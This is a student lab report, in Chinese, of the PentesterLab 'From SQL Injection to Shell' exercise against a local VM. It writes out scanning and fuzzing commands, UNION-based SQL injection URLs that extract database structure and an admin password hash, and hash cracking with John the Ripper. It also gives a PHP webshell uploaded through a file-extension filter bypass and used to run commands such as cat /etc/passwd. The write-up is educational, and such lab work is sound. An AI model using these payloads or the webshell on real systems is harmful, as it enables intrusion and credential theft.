#### 一、实验名称

chap0x07 从SQL注入到Shell 

####  二、实验过程

- 1.配置实验环境

    设置KaliAttackhost攻击者主机为Host-only网络，DebianVictimserver受害者服务器为Host-only网络。

- 2.获取基础网卡信息

    KaliAttackhost攻击者主机为「192.168.56.102」
    
    DebianVictimserver受害者服务器「192.168.56.101」
    
    ![](/网络安全/chap0x07/images/2-2-1.png)


- 3.查看`192.168.56.*/24`子网覆盖范围内可攻击服务器
    ```bash
    nmap -sP 192.168.56.*
    ```

    ![](/网络安全/chap0x07/images/2-3-1.png)

- 4.确定`192.168.56.101/24`为攻击对象，扫描其端口
   ```bash
   nmap -A 192.168.56.101 
   ```

    ![](/网络安全/chap0x07/images/2-4-1.png)

- 5.尝试远程连接
  - A.尝试远程连接`192.168.56.101`的80端口
    ```bash
    nc 192.168.56.101 80
    ```
    ![](/网络安全/chap0x07/images/2-5-A-1.png)

  - B.浏览器访问`192.168.56.101`
  
    ![](/网络安全/chap0x07/images/2-5-B-1.png)

  - C.查看网页源码
     
    ![](/网络安全/chap0x07/images/2-5-C-1.png)

  - D.访问获取页面链接元素等
    
    ![](/网络安全/chap0x07/images/2-5-D-1.png)
    ![](/网络安全/chap0x07/images/2-5-D-2.png)
    ![](/网络安全/chap0x07/images/2-5-D-3.png)
    
- 6.wfuzz暴力破解


```bash
wfuzz -c -z file,wordlist/general/big.txt --hc 404 --conn-delay 20 req-delay 20 http://192.168.1.101/FUZZ
# -c    高亮
# -z file,wordlist/general/big.txt  爆破字典
# --hc 404 隐藏404选项
# http://192.168.1.101/FUZZ 用字典值替换FUZZ
# --conn-delay 设置wfuzz等待web server响应接连的秒数。
# --req-delay 设置wfuzz等待响应完成的最大秒数
```

![](/网络安全/chap0x07/images/2-6-1.png)
![](/网络安全/chap0x07/images/2-6-2.png)

- 7.SQL注入
   - A.sql漏洞存在检测
  
     在DebianVictimserver靶机的浏览器输入`192.168.56.101/cat.php?id=1 or 1=1`显示了该网页全部的图片，与访问`192.168.56.101/all.php`内容一致；输入`192.168.56.101/cat.php?id=2 and1=1`,从结果可得存在sql漏洞。

    ![](/网络安全/chap0x07/images/2-7-A-1.png)
    
   - B.提供不同的id值，网页回显内容也随着不同的id号码改变。
     - id=1
     
        ![](/网络安全/chap0x07/images/2-7-B-1.png)

     - id=2
        
        ![](/网络安全/chap0x07/images/2-7-B-2.png)
         
     - id=3,经过多次试验观察到当设置id等于3的时候，浏览器没有回显任何图片，实验并推测当id>=3或者id<=0时，后台数据库不对应任何图片，没有显示在浏览器的回显内容中
     
        ![](/网络安全/chap0x07/images/2-7-B-3.png)

  - C.开始sql注入
   sql注入成因主要是服务器对页面参数没有进行非法字符校验导致，例如访问的页面的地址为`192.168.56.101/cat.php?id=0`，后台数据库对于用户的请求执行的语句可能为 `SELECT * FROM … where id = {$_GET['id']}`，正常情况下，`{$_GET['id']}`的应该是传入的值`0`，这样页面就能正确的把所有`id`等于`0`的信息显示到页面上，但通过UNION使得数据库查询语句`{$_GET['id']}`参数发生变化，进而通过不同的sql语句实现sql注入。

    - a. 依次尝试在浏览地址栏器输入

        ```bash
       192.168.56.101/cat.php?id=0 UNION SELECT id,2,3,4 from users
       192.168.56.101/cat.php?id=0 UNION SELECT 1,id,3,4 from users
       192.168.56.101/cat.php?id=0 UNION SELECT 1,10,id,4 from users
       192.168.56.101/cat.php?id=0 UNION SELECT 1,5,3,id from users
       ```
       寻找查询回显位置
      
        ![](/网络安全/chap0x07/images/2-7-C-A-1.png)
        ![](/网络安全/chap0x07/images/2-7-C-A-2.png)
        ![](/网络安全/chap0x07/images/2-7-C-A-3.png)
        ![](/网络安全/chap0x07/images/2-7-C-A-4.png)
         
       通过以上尝试获得回显位置，确定更改参数的位置（UNION SELECT 1,「2」,3,4）。

     - b. 获取数据库版本号,浏览器输地址栏入
        ```bash
        192.168.56.101/cat.php?id=0 UNION SELECT 1,@@version,3,4
        ```
        ![](/网络安全/chap0x07/images/2-7-C-B-1.png)
        
     - c. 获取系统当前用户名，浏览器地址栏输入
        ```bash
        192.168.56.101/cat.ph p?id=0 UNION SELECT 1,current_user(),3,4
        ```
       ![](/网络安全/chap0x07/images/2-7-C-C-1.png)

     - d. 获取当前数据库名，浏览器地址栏输入
        ```bash
        192.168.56.101/cat.php?id=1 UNION SELECT  1,database(),3,4
        ```
        ![](/网络安全/chap0x07/images/2-7-C-D-1.png)

     - e. 检索数据库中所有表名，在浏览器地址栏输入
       ```bash
       192.168.56.101/cat.php?id=0 UNION SELECT 1,table_name,3,4 FROM information_schema.tables
       ```
       ![](/网络安全/chap0x07/images/2-7-C-E-1.png)
       
     - f. 检索数据库中所有列名，在浏览器地址栏输入
       ```bash
       192.168.56.101/cat.php?id=0 UNION SELECT 1,table_name,3,4 FROM information_schema.columns
       ```
       ![](/网络安全/chap0x07/images/2-7-C-F-1.png)

     - g. 检索数据库中表名和列名的对应关系，在浏览器输地址栏入
       ```bash
       192.168.56.101/cat.php?id=0 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns
       ```
       ![](/网络安全/chap0x07/images/2-7-C-G-1.png)
       
   - D.利用sql假冒登陆
     - a. 获取管理员登录密码,在浏览器地址栏输入
       ```bash
       192.168.56.101/cat.php?id=0 UNION SELECT 1,concat(id,':',login,':',password),3,4 FROM users
       ```
       ![](/网络安全/chap0x07/images/2-7-D-A-1.png)

     - b. 破解获得的登录密码 8efe310f9ab3efeae8d410a8e0166eb2
      
         1).网页在线破解，破解为`P4ssw0rd`
            
            ![](/网络安全/chap0x07/images/2-7-D-B-1.png)
         
         2).利用John the ripper密码破解工具,终端输入命令
         ```bash
          john ps.txt --format=raw-md5 --wordlist=/usr/share/wordlists/ --rules
          password 告诉 John 什么文件包含密码的哈希值
          --format=raw-md5 告诉 John 密码哈希是 raw-md5 格式
          --wordlist=dico 告诉 John 使用文件 dico 作为字典
          --rules 告诉 John 尝试遍历每个可用的单词
         ```
          ![](/网络安全/chap0x07/images/2-7-D-B-2.png)
          
     - c. 尝试用获得的用户名以及破解的密码以管理员身份假冒登陆
         
         ![](/网络安全/chap0x07/images/2-7-D-C-1.png)

         成功登陆
         
         ![](/网络安全/chap0x07/images/2-7-D-C-2.png)

  - E.webshell相关操作实验
     - a. 构建用于上传的webshell，命名为`test.php`，并上传
       ```bash
        <？php 
            system（$ _ GET ['cmd']）; 
        ?>
       ```
       ![](/网络安全/chap0x07/images/2-7-E-A-1.png)
       
       ![](/网络安全/chap0x07/images/2-7-E-A-2.png)
       
       带有`.php`的上传文件被过滤器过滤掉，更改文件后缀名变为`test.php.php3`

       ![](/网络安全/chap0x07/images/2-7-E-A-3.png)
       
       上传成功
     - b. 浏览器访问`192.168.56.101/admin/uploads/test.php.php3`
        
       ![](/网络安全/chap0x07/images/2-7-E-B-1.png)
         
     - c. 利用上传`test.php.php3`脚本进行cmd测试
     
        1).查看版本信息
          ```bash
          192.168.56.101/admin/uploads/test.php.php3?cmd=uname -a
          ```
          ![](/网络安全/chap0x07/images/2-7-E-C-1.png)

        2).查看当前目录的内容
          ```bash
          192.168.56.101/admin/uploads/test.php.php3?cmd=ls -u
          ```
          ![](/网络安全/chap0x07/images/2-7-E-C-2.png)
          
        3).创建名为‘haha.txt’的文件，并写入内容
          ```bash
          192.168.56.101/admin/uploads/test.php.php3?cmd=touch haha.txt
          192.168.56.101/admin/uploads/test.php.php3?cmd=echo you are weak > haha.txt
          ```
          ![](/网络安全/chap0x07/images/2-7-E-C-3A.png)
          ![](/网络安全/chap0x07/images/2-7-E-C-3B.png)
          
        4).获取靶机系统用户列表 
        
          ```bash
          192.168.56.101/admin/uploads/test.php.php3?cmd=cat /etc/passwd
          ```
          ![](/网络安全/chap0x07/images/2-7-E-C-4.png)

       5).随意测试apt-get相关命令
          
          ![](/网络安全/chap0x07/images/2-7-E-C-5.png)


#### 三、实验问题
- [ ] 在上传webshell 即`test.php`时为了绕开过滤器的过滤开始设置文件后缀名为`.jpeg`，`.png`，但是上传后再进行相关操作，会显示文件包含的内容存在问题。

![](/网络安全/chap0x07/images/QUE-1-1-1.png)
![](/网络安全/chap0x07/images/QUE-1-1-2.png)

- [x] `.jpeg`，`.png`等为图片文件格式，把文件名改为`test.php.php3`成功绕开过滤器的过滤，并可以进行接下来的实验。

- [ ] 在进行上述sql注入实验D步获取当前数据库名，浏览器输入`192.168.56.101/cat.php?id=0 UNION SELECT 1,database(),3,4`，浏览器无法回显出数据库的查询结果数据库的名称

![](/网络安全/chap0x07/images/QUE-2-1.png)

- [x] 更改浏览器输入语句`192.168.56.101/cat.php?id=1 UNION SELECT 1,database(),3,4`，成功得到查询内容

- [x] wfuzz爆破可以用于查找隐藏未链接的资源如脚本等，还可以用于以检查不同类型的注入，虽然成功使用wfuzz进行了本次实验，并观察到了预测的实验结果，未能根本明白在本次sql实验中wfuzz暴力破解的直接或者间接作用，此次实验中进行wfuzz的目的。

##### 参考
- [from_sql_to_shell.md](https://github.com/choitop/ns/blob/f484bac28f8215205ba8e4bc5f66afdcbf6d4b03/2017-2/LAB_whx/LAB3/from_sql_to_shell.md)
- [From SQL Injection to Shell](https://pentesterlab.com/exercises/from_sqli_to_shell/course)
- [网络安全chap0x07实验提交](https://github.com/CUCCS/2018-NS-Public-jckling)